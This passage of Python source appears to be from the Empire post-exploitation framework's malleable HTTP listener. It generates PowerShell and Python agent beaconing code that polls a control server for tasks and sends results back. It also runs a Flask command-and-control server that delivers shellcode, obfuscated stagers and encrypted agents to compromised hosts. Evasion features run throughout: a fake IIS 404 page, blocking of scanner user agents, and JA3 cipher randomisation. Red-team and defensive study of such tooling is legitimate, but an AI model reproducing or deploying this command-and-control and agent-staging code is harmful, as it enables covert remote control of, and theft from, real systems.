                sendMessage += f"$vWc.Headers.Add('{profile.post.client.output.terminator.arg}', $RoutingPacket);"

            # ==== ADD BODY ====
            if profile.post.client.output.terminator.type == malleable.Terminator.PRINT:
                sendMessage += "$body = $RoutingPacket;"
            else:
                sendMessage += f"$body = '{profile.post.client.body}';"

            # ==== SEND REQUEST ====
            sendMessage += "try {"
            if (
                profile.post.client.verb.lower() != "get"
                or profile.post.client.body
                or profile.post.client.output.terminator.type
                == malleable.Terminator.PRINT
            ):
                sendMessage += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{profile.post.client.verb.upper()}', [System.Text.Encoding]::Default.GetBytes($body));"
            else:
                sendMessage += "$result = $vWc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"

            # ==== HANDLE ERROR ====
            sendMessage += """
} catch [System.Net.WebException] {
if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
Start-Negotiate -S "$Script:server" -SK $Script:StagingKey -UA $Script:UserAgent;
}}}}};
"""
            return updateServers + getTask + sendMessage

        if language.lower() == "python":
            sendMessage = f"""
import base64
import urllib
import random
import sys

_sysrand = random.SystemRandom()


class ExtendedPacketHandler(PacketHandler):
    def __init__(self, agent, staging_key, session_id, headers, server, taskURIs, key=None):
        super().__init__(agent=agent, staging_key=staging_key, session_id=session_id, key=key)
        self.headers = headers
        self.taskURIs = taskURIs
        self.server = server

    def post_message(self, uri, data):
        return (urllib.request.urlopen(urllib.request.Request(uri, data, self.headers))).read()

    def send_results_for_child(self, received_data):
        self.headers['Cookie'] = "session=%s" % (received_data[1:])
        taskUri = _sysrand.choice({profile.post.client.uris!s})
        requestUri = self.server + taskUri
        response = (urllib.request.urlopen(urllib.request.Request(requestUri, None, self.headers))).read()
        return response

    def send_get_tasking_for_child(self, received_data):
        decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
        taskUri = _sysrand.choice({profile.post.client.uris!s})
        requestUri = self.server + taskUri
        response = (urllib.request.urlopen(urllib.request.Request(requestUri, decoded_data, self.headers))).read()
        return response

    def send_staging_for_child(self, received_data, hop_name):
        postURI = self.server + _sysrand.choice({profile.post.client.uris!s})
        self.headers['Hop-Name'] = hop_name
        decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
        response = (urllib.request.urlopen(urllib.request.Request(postURI, decoded_data, self.headers))).read()
        return response
"""
            sendMessage += "    def send_message(self, packets=None):\n"
            sendMessage += "        vreq = type('vreq', (urllib.request.Request, object), {'get_method':lambda self:self.verb if (hasattr(self, 'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"

            # ==== BUILD POST ====
            sendMessage += "        if packets:\n"

            # ==== BUILD ROUTING PACKET ====
            sendMessage += (
                "            encData = aes_encrypt_then_hmac(self.key, packets);\n"
            )
            sendMessage += "            routingPacket = self.build_routing_packet(self.staging_key, self.session_id, meta=5, enc_data=encData);\n"
            sendMessage += (
                "\n".join(
                    [
                        "            " + _
                        for _ in profile.post.client.output.generate_python(
                            "routingPacket"
                        ).split("\n")
                    ]
                )
                + "\n"
            )

            # ==== CHOOSE URI ====
            sendMessage += (
                "            taskUri = _sysrand.choice("
                + str(profile.post.client.uris)
                + ")\n"
            )
            sendMessage += "            requestUri = self.server + taskUri\n"

            # ==== ADD PARAMETERS ====
            sendMessage += "            parameters = {}\n"
            for parameter, value in profile.post.client.parameters.items():
                sendMessage += (
                    "            parameters['" + parameter + "'] = '" + value + "'\n"
                )
            if (
                profile.post.client.output.terminator.type
                == malleable.Terminator.PARAMETER
            ):
                sendMessage += (
                    "            parameters['"
                    + profile.post.client.output.terminator.arg
                    + "'] = routingPacket;\n"
                )
            sendMessage += "            if parameters:\n"
            sendMessage += "                requestUri += '?' + urllib.parse.urlencode(parameters)\n"

            if (
                profile.post.client.output.terminator.type
                == malleable.Terminator.URIAPPEND
            ):
                sendMessage += "            requestUri += routingPacket\n"

            # ==== ADD BODY ====
            if profile.post.client.output.terminator.type == malleable.Terminator.PRINT:
                sendMessage += "            body = routingPacket\n"
            else:
                sendMessage += "            body = '" + profile.post.client.body + "'\n"
            sendMessage += "            try:\n                body=body.encode()\n            except AttributeError:\n                pass\n"

            # ==== BUILD REQUEST ====
            sendMessage += "            req = vreq(requestUri, body)\n"
            sendMessage += "            req.verb = '" + profile.post.client.verb + "'\n"

            # ==== ADD HEADERS ====
            for header, value in profile.post.client.headers.items():
                sendMessage += (
                    "            req.add_header('" + header + "', '" + value + "')\n"
                )
            if (
                profile.post.client.output.terminator.type
                == malleable.Terminator.HEADER
            ):
                sendMessage += (
                    "            req.add_header('"
                    + profile.post.client.output.terminator.arg
                    + "', routingPacket)\n"
                )

            # ==== BUILD GET ====
            sendMessage += "        else:\n"

            # ==== BUILD ROUTING PACKET
            sendMessage += "            routingPacket = self.build_routing_packet(self.staging_key, self.session_id, meta=4);\n"
            sendMessage += (
                "\n".join(
                    [
                        "            " + _
                        for _ in profile.get.client.metadata.generate_python(
                            "routingPacket"
                        ).split("\n")
                    ]
                )
                + "\n"
            )

            # ==== CHOOSE URI ====
            sendMessage += (
                "            taskUri = _sysrand.choice("
                + str(profile.get.client.uris)
                + ")\n"
            )
            sendMessage += "            requestUri = self.server + taskUri;\n"

            # ==== ADD PARAMETERS ====
            sendMessage += "            parameters = {}\n"
            for parameter, value in profile.get.client.parameters.items():
                sendMessage += (
                    "             parameters['" + parameter + "'] = '" + value + "'\n"
                )
            if (
                profile.get.client.metadata.terminator.type
                == malleable.Terminator.PARAMETER
            ):
                sendMessage += (
                    "             parameters['"
                    + profile.get.client.metadata.terminator.arg
                    + "'] = routingPacket\n"
                )
            sendMessage += "            if parameters:\n"
            sendMessage += "                requestUri += '?' + urllib.parse.urlencode(parameters)\n"

            if (
                profile.get.client.metadata.terminator.type
                == malleable.Terminator.URIAPPEND
            ):
                sendMessage += "                requestUri += routingPacket;\n"

            # ==== ADD BODY ====
            if (
                profile.get.client.metadata.terminator.type
                == malleable.Terminator.PRINT
            ):
                sendMessage += "                body = routingPacket\n"
            else:
                sendMessage += "            body = '" + profile.get.client.body + "'\n"
            sendMessage += "            try:\n                body=body.encode()\n            except AttributeError:\n                pass\n"

            # ==== BUILD REQUEST ====
            sendMessage += "            req = vreq(requestUri, body)\n"
            sendMessage += "            req.verb = '" + profile.get.client.verb + "'\n"

            # ==== ADD HEADERS ====
            for header, value in profile.get.client.headers.items():
                sendMessage += (
                    "            req.add_header('" + header + "', '" + value + "')\n"
                )
            if (
                profile.get.client.metadata.terminator.type
                == malleable.Terminator.HEADER
            ):
                sendMessage += (
                    "            req.add_header('"
                    + profile.get.client.metadata.terminator.arg
                    + "', routingPacket)\n"
                )

            # ==== SEND REQUEST ====
            sendMessage += "        try:\n"
            sendMessage += "            res = urllib.request.urlopen(req);\n"

            # ==== EXTRACT RESPONSE ====
            if profile.get.server.output.terminator.type == malleable.Terminator.HEADER:
                header = profile.get.server.output.terminator.arg
                sendMessage += (
                    "            data = res.info().dict['"
                    + header
                    + "'] if '"
                    + header
                    + "' in res.info().dict else ''\n"
                )
                sendMessage += "            data = urllib.parse.unquote(data)\n"
            elif (
                profile.get.server.output.terminator.type == malleable.Terminator.PRINT
            ):
                sendMessage += "            data = res.read()\n"

            # ==== DECODE RESPONSE ====
            sendMessage += (
                "\n".join(
                    [
                        "        " + _
                        for _ in profile.get.server.output.generate_python_r(
                            "data"
                        ).split("\n")
                    ]
                )
                + "\n"
            )
            # before return we encode to bytes, since in some transformations "join" produces str
            sendMessage += (
                "            if isinstance(data,str): data = data.encode('latin-1');\n"
            )
            sendMessage += "            return ('200', data)\n"

            # ==== HANDLE ERROR ====
            sendMessage += "        except urllib.request.HTTPError as HTTPError:\n"
            sendMessage += "            self.missedCheckins += 1\n"
            sendMessage += "            if HTTPError.code == 401:\n"
            sendMessage += "                sys.exit(0)\n"
            sendMessage += "            return (HTTPError.code, '')\n"
            sendMessage += "        except urllib.request.URLError as URLError:\n"
            sendMessage += "            self.missedCheckins += 1\n"
            sendMessage += "            return (URLError.reason, '')\n"

            sendMessage += "        return ('', '')\n"

            return sendMessage

        if language.lower() in ("csharp", "go"):
            # csharp (Sharpire) and go (Gopire) are stageless — the comms code
            # is baked into the compiled launcher binary.
            return ""

        log.error(
            "listeners/http_malleable generate_comms(): invalid language specification, only 'powershell', 'python', 'csharp', and 'go' are currently supported for this module."
        )
        return None

    def start_server(self, listenerOptions):
        """
        Threaded function that actually starts up the Flask server.
        """

        # make a copy of the currently set listener options for later stager/agent generation
        listenerOptions = copy.deepcopy(listenerOptions)

        # extract the set options for this instantiated listener
        bindIP = listenerOptions["BindIP"]["Value"]
        port = listenerOptions["Port"]["Value"]
        host = listenerOptions["Host"]["Value"]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        certPath = listenerOptions["CertPath"]["Value"]

        # build and validate profile
        profile = malleable.Profile._deserialize(self.serialized_profile)
        profile.validate()

        listener_name = self.options["Name"]["Value"]
        listener_uses_https = str(host).startswith("https")

        # Warn if the profile defines an https-certificate block AND the
        # listener is configured for HTTPS — the block does not yet drive
        # cert generation, so the operator's CN/O/validity won't take
        # effect. We deliberately gate on listener_uses_https rather than
        # `certPath` truthiness: an empty CertPath still falls back to the
        # boot-generated pair under DATA_DIR/cert, so the warning must fire
        # there too. The original `certPath and ...` guard missed that case
        # and false-positived on stale HTTP listeners.
        if listener_uses_https and not profile.https_certificate.is_default():
            effective_cert_path = (
                certPath
                if (certPath and str(certPath).strip())
                else f"{config_manager.CERT_DIR} (default)"
            )
            self.instance_log.warning(
                "%s: https-certificate block in profile is ignored — Empire "
                "loads the PEM from %r. Profile values (CN=%r, O=%r, "
                "validity=%r) will not take effect until runtime cert "
                "generation lands.",
                listener_name,
                effective_cert_path,
                profile.https_certificate.cn,
                profile.https_certificate.o,
                profile.https_certificate.validity,
            )

        # `set headers "A, B, C";` declares response-header ordering. The
        # underlying Flask/Werkzeug stack does not expose a way to enforce
        # ordering, so we surface it as an operator-visible INFO note
        # rather than silently storing inert state (the second-pass review
        # called this out as a future-rot risk).
        if profile.http_config.header_order:
            self.instance_log.info(
                "%s: profile declares header_order=%r — Empire cannot enforce "
                "response header ordering (Flask/Werkzeug limitation). "
                "Ordering will be best-effort.",
                listener_name,
                list(profile.http_config.header_order),
            )

        # Boot-time freshness contract: trust_x_forwarded_for,
        # block_useragent_globs, http_config_headers, and ua_length_cap
        # are all captured here from the same boot-time profile. They
        # remain stable for the listener's lifetime. The per-request
        # `Profile._deserialize` at the top of handle_request only
        # rebuilds the malleable transaction state (URIs, transforms,
        # terminators) — the http-config knobs do not need that work.
        #
        # Profile reload via POST /api/v2/malleable-profiles/reload
        # updates the DB but does NOT mutate self.serialized_profile.
        # Active listeners must be restarted to pick up profile changes.
        trust_x_forwarded_for = profile.http_config.trust_x_forwarded_for
        block_useragent_globs = profile.http_config.block_useragents
        # Cap UA bytes before fnmatch to bound worst-case glob cost.
        # 4 KiB is well above the longest UA in shipped CS profiles
        # (~200 bytes including the leading `header "User-Agent"`
        # declaration). Be aware: `*needle*` style globs cannot match
        # anywhere past the cap, so an attacker padding with 4 KiB of
        # innocent bytes can slip a suffix-glob block. Prefix and exact
        # globs (the common case for blocking curl/wget/lynx) are
        # unaffected.
        ua_length_cap = 4096

        # suppress the normal Flask output
        log = logging.getLogger("werkzeug")
        log.setLevel(logging.ERROR)

        if os.environ.get("TEST_MODE"):
            # Let's not start the server if we're running tests.
            while True:
                time.sleep(1)

        # initialize flask server
        app = Flask(__name__, template_folder=self.template_dir)
        self.app = app

        # http-config { header "X" "Y"; } directives merge into every
        # non-blocked response. Captured by closure from the boot-time
        # profile (see freshness contract comment above). Use
        # setdefault() so per-response headers set by the request handler
        # (e.g. malleable http-get/http-post server-block headers) take
        # precedence over http-config defaults.
        #
        # Headers are intentionally merged onto the 404 from the UA-block
        # path too: a blocked scanner getting `Server: Apache` looks
        # identical to a real "URI not found" Apache 404, which is the
        # blending the operator wanted when they configured both
        # block_useragents and the header directive.
        http_config_headers = list(profile.http_config.headers)
        if http_config_headers:

            @app.after_request
            def _merge_http_config_headers(response):
                for name, value in http_config_headers:
                    response.headers.setdefault(name, value)
                return response

        # 404 rather than 200, matching the plain http listener and every other
        # default-response return in this file: default.html *is* an IIS "404 -
        # File or directory not found" body, so pairing it with a 200 is itself
        # an anomaly, and a launcher one-liner that DownloadData()s a stager URI
        # must see the failure rather than Assembly.Load() an HTML page.
        listener_util.register_default_response_error_handler(app, self, 404)

        @app.route("/", methods=["GET", "POST"])
        @app.route("/<path:request_uri>", methods=["GET", "POST"])
        def handle_request(request_uri="", tempListenerOptions=None):
            """
            Handle an agent request.
            """
            # Derive clientIP first — needed for the UA-block log and the
            # full request log line below. trust_x_forwarded_for defaults
            # to False (a True default would be a spoofing vector since
            # the header is attacker-controllable without a trusted
            # upstream proxy). When True, take the FIRST entry in XFF —
            # the de-facto convention (mirrors the leftmost-is-client
            # rule from RFC 7239 §5.2 for the standardized `Forwarded`
            # header, which XFF predates).
            #
            # The forwarded value is validated as an IPv4/IPv6 address
            # before assignment; arbitrary strings would otherwise flow
            # into agent records, host registration, and Starkiller.
            clientIP = request.remote_addr
            if trust_x_forwarded_for:
                xff = request.headers.get("X-Forwarded-For")
                if xff:
                    forwarded = xff.split(",")[0].strip()
                    if forwarded:
                        try:
                            ipaddress.ip_address(forwarded)
                            clientIP = forwarded
                        except ValueError:
                            self.instance_log.warning(
                                "%s: ignoring malformed X-Forwarded-For=%r from %s",
                                self.options["Name"]["Value"],
                                forwarded[:120],
                                request.remote_addr,
                            )

            # block_useragents fast-path: short-circuit before the
            # per-request profile deserialize so adversarial scanner
            # traffic does not pay the deserialization cost. fnmatch
            # globs only — no regex — to avoid ReDoS from operator-pasted
            # public CS profiles. UA bytes are capped before evaluation
            # so the worst-case scan stays bounded.
            if block_useragent_globs:
                ua_raw = (request.headers.get("User-Agent") or "")[:ua_length_cap]
                ua = ua_raw.lower()
                if any(fnmatch.fnmatchcase(ua, pat) for pat in block_useragent_globs):
                    self.instance_log.warning(
                        "%s: blocking request from %s on User-Agent match (UA=%r)",
                        self.options["Name"]["Value"],
                        clientIP,
                        ua_raw[:120],
                    )
                    return Response(self.default_response(), 404)

            data = request.get_data()
            url = request.url
            method = request.method
            headers = request.headers
            profile = malleable.Profile._deserialize(self.serialized_profile)

            # log request
            listenerName = self.options["Name"]["Value"]
            message = f"{listenerName}: {request.method.upper()} request for {request.host}/{request_uri} from {clientIP} ({len(request.data)} bytes)"
            self.instance_log.info(message)

            try:
                # build malleable request from flask request
                malleableRequest = malleable.MalleableRequest()
                malleableRequest.url = url
                malleableRequest.verb = method
                malleableRequest.headers = headers
                malleableRequest.body = data

                # fix non-ascii characters
                if "%" in malleableRequest.path:
                    malleableRequest.path = urllib.parse.unquote(malleableRequest.path)

                # identify the implementation by uri
                implementation = None
                for uri in sorted(
                    (profile.stager.client.uris or ["/"])
                    + (profile.get.client.uris or ["/"])
                    + (profile.post.client.uris or ["/"]),
                    key=len,
                    reverse=True,
                ):
                    if request_uri.startswith(uri.lstrip("/")):
                        # match!
                        for imp in [profile.stager, profile.get, profile.post]:
                            if uri in (imp.client.uris or ["/"]):
                                implementation = imp
                                break
                        if implementation:
                            break

                if not implementation:
                    message = f"{listenerName}: unknown uri /{request_uri} requested by {clientIP}."
                    self.instance_log.warning(message)
                    # Return the shared IIS-7.5 404 page so the listener
                    # fingerprint stays uniform across the host_stage gate,
                    # block_useragents fast-path, and unknown-URI dispatch.
                    # Without this return the closure falls through to
                    # `implementation.extract_client(...)` with
                    # implementation=None, raising AttributeError and
                    # surfacing a Flask 500 — a distinctive fingerprint
                    # any non-blocked scanner can probe for.
                    return Response(self.default_response(), 404)

                # Tier 0 host_stage gate: if the operator set `host_stage
                # "false";` in the profile, refuse to serve the stager URI
                # at all. Returns the IIS 7.5 default 404 page so the
                # listener fingerprint is indistinguishable from "URI does
                # not exist." We log at WARNING because this is normally an
                # interesting event (someone hit a disabled stager URI).
                if implementation is profile.stager and not getattr(
                    profile, "host_stage", True
                ):
                    self.instance_log.warning(
                        f"{listenerName}: refusing stager URI /{request_uri} from {clientIP} (host_stage disabled)"
                    )
                    return Response(self.default_response(), 404)

                # attempt to extract information from the request
                if implementation is profile.stager and request.method == "POST":
                    # stage 1 negotiation comms are hard coded, so we can't use malleable
                    agentInfo = malleableRequest.body
                    self.instance_log.debug(
                        f"{listenerName}: extracted agentInfo from raw body, len={len(agentInfo) if agentInfo else 0}"
                    )
                elif implementation is profile.post:
                    # the post implementation has two spots for data, requires two-part extraction
                    agentInfo, output = implementation.extract_client(malleableRequest)
                    agentInfo = (agentInfo or b"") + (output or b"")
                    self.instance_log.debug(
                        f"{listenerName}: extracted agentInfo from post (two-part), len={len(agentInfo)}"
                    )
                else:
                    agentInfo = implementation.extract_client(malleableRequest)
                    self.instance_log.debug(
                        f"{listenerName}: extracted agentInfo via extract_client(), len={len(agentInfo) if agentInfo else 0}"
                    )

                if agentInfo:
                    agentInfo = listener_util.ensure_raw_bytes(agentInfo)
                    dataResults = self.mainMenu.agentcommsv2.handle_agent_data(
                        stagingKey,
                        self.agent_public_cert_key,
                        self.server_private_cert_key,
                        self.server_public_cert_key,
                        agentInfo,
                        listenerOptions,
                        clientIP,
                    )

                    if not dataResults or len(dataResults) <= 0:
                        # log error parsing routing packet
                        message = f"{listenerName} Error parsing routing packet from {clientIP}: {agentInfo!s}."
                        self.instance_log.error(message)
                        log.error(message)

                    for language, results, additional in dataResults:
                        if results:
                            if isinstance(results, str):
                                results = results.encode("latin-1")
                            if results == b"STAGE0":
                                # step 2 of negotiation -> server returns stager (stage 1)

                                # log event
                                message = f"{listenerName} Sending {language} stager (stage 1) to {clientIP}"
                                self.instance_log.info(message)
                                log.info(message)

                                # build stager (stage 1)
                                with SessionLocal() as db:
                                    obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
                                        db, language
                                    )

                                    if additional.lower() == "shellcode":
                                        stage, err = (
                                            self.mainMenu.stagergenv2.generate_shellcode(
                                                language=language.lower(),
                                                listener_name=listenerName,
                                                obfuscate=obf_config.enabled
                                                if obf_config
                                                else False,
                                                obfuscation_command=obf_config.command
                                                if obf_config
                                                else "",
                                                arch="both",
                                                dot_net_version="net40",
                                            )
                                        )
                                        if err:
                                            log.error(
                                                f"Error generating shellcode: {err}"
                                            )
                                            return Response(
                                                self.default_response(), 404
                                            )
                                        malleableResponse = (
                                            implementation.construct_server(stage)
                                        )
                                        return Response(
                                            malleableResponse.body,
                                            malleableResponse.code,
                                            malleableResponse.headers,
                                        )

                                    stager = self.generate_stager(
                                        language=language,
                                        listenerOptions=listenerOptions,
                                        obfuscate=(
                                            False
                                            if not obf_config
                                            else obf_config.enabled
                                        ),
                                        obfuscation_command=(
                                            "" if not obf_config else obf_config.command
                                        ),
                                    )

                                # build malleable response with stager (stage 1)
                                malleableResponse = implementation.construct_server(
                                    stager
                                )

                                if "Server" in malleableResponse.headers:
                                    WSGIRequestHandler.server_version = (
                                        malleableResponse.headers["Server"]
                                    )
                                    WSGIRequestHandler.sys_version = ""

                                return Response(
                                    malleableResponse.body,
                                    malleableResponse.code,
                                    malleableResponse.headers,
                                )

                            if results.startswith(b"STAGE2"):
                                # step 6 of negotiation -> server sends patched agent (stage 2)

                                if ":" in clientIP:
                                    clientIP = "[" + clientIP + "]"
                                sessionID = (
                                    results.split(b" ")[1].strip().decode("UTF-8")
                                )
                                sessionKey = self.mainMenu.agentcommsv2.agents[
                                    sessionID
                                ]["sessionKey"]

                                # log event
                                message = f"{listenerName}: Sending agent (stage 2) to {sessionID} at {clientIP}"
                                self.instance_log.info(message)
                                log.info(message)

                                # TODO: handle this with malleable??
                                tempListenerOptions = None
                                if "Hop-Name" in request.headers:
                                    hopListenerName = request.headers.get("Hop-Name")
                                    if hopListenerName:
                                        try:
                                            hopListener = (
                                                data_util.get_listener_options(
                                                    hopListenerName
                                                )
                                            )
                                            tempListenerOptions = copy.deepcopy(
                                                listenerOptions
                                            )
                                            tempListenerOptions["Host"]["Value"] = (
                                                hopListener["Host"]["Value"]
                                            )
                                        except TypeError:
                                            tempListenerOptions = listenerOptions

                                session_info = (
                                    SessionLocal()
                                    .scalars(
                                        select(models.Agent).where(
                                            models.Agent.session_id == sessionID
                                        )
                                    )
                                    .first()
                                )
                                if session_info.language == "ironpython":
                                    version = "ironpython"
                                else:
                                    version = ""

                                # generate agent
                                with SessionLocal() as db:
                                    obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
                                        db, language
                                    )
                                    agentCode = self.generate_agent(
                                        language=language,
                                        listenerOptions=(
                                            tempListenerOptions or listenerOptions
                                        ),
                                        obfuscate=(
                                            False
                                            if not obf_config
                                            else obf_config.enabled
                                        ),
                                        obfuscation_command=(
                                            "" if not obf_config else obf_config.command
                                        ),
                                        version=version,
                                    )

                                sessionKey = bytes.fromhex(sessionKey)
                                encryptedAgent = AESCipher.encrypt_then_hmac(
                                    sessionKey, agentCode.encode("UTF-8")
                                )

                                # build malleable response with agent
                                # note: stage1 comms are hard coded, can't use malleable here.
                                return Response(
                                    packets.build_routing_packet(
                                        stagingKey,
                                        sessionID,
                                        language,
                                        encData=encryptedAgent,
                                    ),
                                    200,
                                    implementation.server.headers,
                                )

                            if results[:10].lower().startswith(b"error") or results[
                                :10
                            ].lower().startswith(b"exception"):
                                # agent returned an error
                                message = f"{listenerName}: Error returned for results by {clientIP} : {results}"
                                self.instance_log.error(message)
                                log.error(message)

                                return Response(self.default_response(), 404)

                            if results.startswith(b"ERROR:"):
                                # error parsing agent data
                                message = f"{listenerName}: Error from agents.handle_agent_data() for {request_uri} from {clientIP}: {results}"
                                self.instance_log.error(message)
                                log.error(message)

                                if b"not in cache" in results:
                                    # signal the client to restage
                                    log.info(
                                        f"{listenerName} Orphaned agent from {clientIP}, signaling restaging"
                                    )
                                    return make_response("", 401)

                                return Response(self.default_response(), 404)

                            if results == b"VALID":
                                # agent posted results
                                message = f"{listenerName} Valid results returned by {clientIP}"
                                self.instance_log.info(message)

                                malleableResponse = implementation.construct_server("")

                                if "Server" in malleableResponse.headers:
                                    WSGIRequestHandler.server_version = (
                                        malleableResponse.headers["Server"]
                                    )
                                    WSGIRequestHandler.sys_version = ""

                                return Response(
                                    malleableResponse.body,
                                    malleableResponse.code,
                                    malleableResponse.headers,
                                )

                            if request.method == b"POST":
                                # step 4 of negotiation -> server returns RSA(nonce+AESsession))

                                message = (
                                    f"{listenerName}: Sending session key to {clientIP}"
                                )
                                self.instance_log.info(message)
                                log.info(message)

                                # note: stage 1 negotiation comms are hard coded, so we can't use malleable
                                return Response(
                                    results,
                                    200,
                                    implementation.server.headers,
                                )

                            # agent requested taskings
                            message = f"{listenerName}: Agent from {clientIP} retrieved taskings"
                            self.instance_log.info(message)

                            # build malleable response with results
                            malleableResponse = implementation.construct_server(results)
                            if isinstance(malleableResponse.body, str):
                                malleableResponse.body = malleableResponse.body.encode(
                                    "latin-1"
                                )

                            if "Server" in malleableResponse.headers:
                                WSGIRequestHandler.server_version = (
                                    malleableResponse.headers["Server"]
                                )
                                WSGIRequestHandler.sys_version = ""

                            return Response(
                                malleableResponse.body,
                                malleableResponse.code,
                                malleableResponse.headers,
                            )

                        # no tasking for agent
                        message = (
                            f"{listenerName}: Agent from {clientIP} retrieved taskings"
                        )
                        self.instance_log.info(message)

                        # build malleable response with no results
                        malleableResponse = implementation.construct_server(results)

                        if "Server" in malleableResponse.headers:
                            WSGIRequestHandler.server_version = (
                                malleableResponse.headers["Server"]
                            )
                            WSGIRequestHandler.sys_version = ""

                        return Response(
                            malleableResponse.body,
                            malleableResponse.code,
                            malleableResponse.headers,
                        )

                else:
                    # If no agentinfo then attempt to send ironpython agent.
                    with SessionLocal.begin() as db:
                        obfuscation_config = (
                            self.mainMenu.obfuscationv2.get_obfuscation_config(
                                db, "csharp"
                            )
                        )
                        obfuscation = obfuscation_config.enabled

                    # Outside the session on purpose: generate_launcher() opens
                    # its own SessionLocal.begin(), so calling it from inside
                    # this one holds two pooled connections per unauthenticated
                    # request and 13 concurrent peers exhaust the whole
                    # process's pool (pool_size 10 + max_overflow 15).
                    launcher = self.mainMenu.stagergenv2.generate_launcher(
                        listener_name=listenerName,
                        language="python",
                        encode=False,
                        obfuscate=obfuscation,
                    )

                    directory = self.mainMenu.stagergenv2.generate_python_exe(
                        launcher, dot_net_version="net40", obfuscate=obfuscation
                    )
                    return listener_util.read_stager_artifact(directory)

                # log invalid request
                message = (
                    f"/{request_uri} requested by {clientIP} with no routing packet."
                )
                self.instance_log.error(message)

            except malleable.MalleableError as e:
                # probably an issue with the malleable library, please report it :)
                message = f"{listenerName}: Malleable had trouble handling a request for /{request_uri} by {clientIP}: {e!s}."
                self.instance_log.error(message, exc_info=True)
                log.error(message, exc_info=True)

            return Response(self.default_response(), 200)

        try:
            ja3_evasion = listenerOptions["JA3_Evasion"]["Value"]

            if host.startswith("https"):
                if certPath.strip() == "" or not Path(certPath).is_dir():
                    log.info(f"Unable to find certpath {certPath}, using default.")
                    # The pair server.run generates at boot. The old default was
                    # a CWD-relative "setup", which never held a certificate and
                    # resolved against wherever the operator happened to launch.
                    certPath = config_manager.CERT_DIR
                cert_path = Path(certPath).resolve()
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                context.minimum_version = ssl.TLSVersion.TLSv1_2
                context.load_cert_chain(
                    cert_path / cert_util.CERT_FILENAME,
                    cert_path / cert_util.KEY_FILENAME,
                )

                if ja3_evasion:
                    context.set_ciphers(listener_util.generate_random_cipher())

                app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
            else:
                app.run(host=bindIP, port=int(port), threaded=True)
        except Exception as e:
            message = f"Listener startup on port {port} failed - {e.__class__.__name__}: {e!s}"
            self.instance_log.error(message, exc_info=True)
            log.error(message, exc_info=True)

    def start(self):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.thread property.
        """
        self.instance_log = log_util.get_listener_logger(
            LOG_NAME_PREFIX, self.options["Name"]["Value"]
        )
        listenerOptions = self.options
        self.thread = helpers.KThread(target=self.start_server, args=(listenerOptions,))
        self.thread.daemon = True
        self.thread.start()
        time.sleep(0.1 if os.environ.get("TEST_MODE") else 1)
        # returns True if the listener successfully started, false otherwise
        return self.thread.is_alive()

    def shutdown(self):
        """
        Terminates the server thread stored in the self.thread property.
        """
        to_kill = self.options["Name"]["Value"]
        self.instance_log.info(f"{to_kill}: shutting down...")
        log.info(f"{to_kill}: shutting down...")
        self.thread.kill()
